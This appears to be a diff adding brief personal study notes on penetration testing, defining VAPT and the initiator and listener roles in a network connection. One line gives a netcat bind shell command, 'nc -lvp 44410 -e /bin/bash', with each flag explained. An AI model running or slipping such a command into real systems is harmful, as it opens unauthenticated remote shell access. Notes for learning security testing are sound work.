@@ -1,0 +1,7 @@
+-> VAPT = Vulnerability Assessment and Penetration Testing
+
+-> If you find that you can run commands somewhere
+-> initiator - I wanna connect
+-> listener - I want someone to connect to me - runs on a particular port
+  nc -lvp(listen, verbosity,port) 44410(port) -e(execute a specific command) /bin/bash
+  
